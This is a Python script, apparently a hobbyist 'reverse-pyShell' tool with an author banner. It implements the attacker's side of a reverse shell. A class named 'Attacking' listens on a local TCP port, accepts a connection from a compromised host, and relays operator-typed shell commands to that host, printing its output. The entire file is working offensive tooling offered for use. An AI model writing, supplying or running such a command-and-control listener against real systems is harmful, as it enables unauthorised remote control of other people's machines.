#!/usr/bin/env python3

import socket
import signal
import sys

class Attacking:

    BOLD = '\033[1m'                # Bold font
    RESET = '\033[0m'               # Reset all
    BRIGHT_RED = '\033[91m'         # Red Color
    BRIGHT_GREEN = '\033[92m'       # Green Color
    BRIGHT_MAGENTA = '\033[95m'     # Magenta Color
    BRIGHT_CYAN = '\033[96m'        # Cyan Color

    banner = f"""{BRIGHT_GREEN}{BOLD}

                                                            (       )     (    (     
                                                            )\ ) ( /(     )\ ) )\ )  
                (     (   )     (  (        (           (   (()/( )\())(  (()/((()/(  
                )(   ))\ /((   ))\ )(  (   ))\ ___`  )  )\ ) /(_)((_)\ )\  /(_))/(_)) 
                (()\ /((_(_))\ /((_(()\ )\ /((_|___/(/( (()/((_))  _((_((_)(_)) (_))   
                ((_(_)) _)((_(_))  ((_((_(_))    ((_)_\ )(_)/ __|| || | __| |  | |    
                | '_/ -_)\ V // -_)| '_(_-/ -_)   | '_ \| || \__ \| __ | _|| |__| |__  
                |_| \___| \_/ \___||_| /__\___|   | .__/ \_, |___/|_||_|___|____|____| 
                                                |_|    |__/                           

                                                Author  : Naresh
                                                Github  : https://github.com/theNareshofficial
                                                Youtube : https://www.youtube.com/@nareshtechweb930

    {RESET}
    """

    def __init__(self):
        self.sock = None

    def create_socket(self):
        print(f"{self.BRIGHT_MAGENTA}[~] {self.BRIGHT_CYAN}Creating Socket{self.RESET}")
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print(f"{self.BRIGHT_MAGENTA}[+]{self.BRIGHT_CYAN} Socket Created{self.RESET}")
        except Exception as sock_error:
            print(f"{self.BRIGHT_MAGENTA}[!]{self.BRIGHT_RED} Socket Error: {sock_error}{self.RESET}")
            self.sock = None

    def start_server(self, host="127.0.0.1", port=8080):
        if self.sock is None:
            print(f"{self.BRIGHT_MAGENTA}[!]{self.BRIGHT_CYAN} No socket available{self.RESET}")
            return
        
        try:
            print(f"{self.BRIGHT_MAGENTA}[~]{self.BRIGHT_CYAN} Binding to {host}:{port}{self.RESET}")
            self.sock.bind((host, port))
            print(f"{self.BRIGHT_MAGENTA}[+]{self.BRIGHT_CYAN} Socket Bound{self.RESET}")
        except Exception as bind_error:
            print(f"{self.BRIGHT_MAGENTA}[!]{self.BRIGHT_RED} Bind Error: {bind_error} {host} : {port} {self.RESET}")
            self.close_socket()
            return
 
        try:
            print(f"{self.BRIGHT_MAGENTA}[~]{self.BRIGHT_CYAN} Listening on {host}:{port}{self.RESET}")
            self.sock.listen(5)
            print(f"{self.BRIGHT_MAGENTA}[+]{self.BRIGHT_CYAN} Listening...{self.RESET}")
        except Exception as listen_error:
            print(f"{self.BRIGHT_MAGENTA}[!]{self.BRIGHT_RED} Listen Error: {listen_error}{self.RESET}")
            self.close_socket()
            return

        try:
            print(f"{self.BRIGHT_MAGENTA}[~]{self.BRIGHT_CYAN} Waiting for connections on {host}:{port}{self.RESET}")
            conn, addr = self.sock.accept()
            print(f"{self.BRIGHT_MAGENTA}[+]{self.BRIGHT_CYAN} We got a connection from {addr}{self.RESET}")

            while True:
                command = input(f"{self.BRIGHT_GREEN}{addr[0]}:shell>>> ").strip()
                if command.lower() == "exit":
                    print(f"{self.BRIGHT_MAGENTA}[!]{self.BRIGHT_RED} Closing connection and exiting...{self.RESET}")
                    conn.send(b"exit")
                    break
                else:
                    conn.send(command.encode())
                    response = conn.recv(1024)
                    print(response.decode())
        
        except Exception as connect_error:
            print(f"{self.BRIGHT_MAGENTA}[!]{self.BRIGHT_RED} Connection Error: {connect_error}{self.RESET}")
        
        finally:
            if conn:
                conn.close()
            self.close_socket()

    def close_socket(self):
        if self.sock:
            self.sock.close()
            print(f"{self.BRIGHT_MAGENTA}[~]{self.BRIGHT_RED} Socket Closed{self.RESET}")

    def signal_handler(self, sig, frame):
        print(f"\n{self.BRIGHT_MAGENTA}[~]{self.BRIGHT_RED} Interrupt received, closing socket and exiting...{self.RESET}")
        self.close_socket()
        sys.exit(0)

if __name__ == "__main__":
    attack_instance = Attacking()
    print(attack_instance.banner)
    signal.signal(signal.SIGINT, attack_instance.signal_handler)
    attack_instance.create_socket()
    attack_instance.start_server()
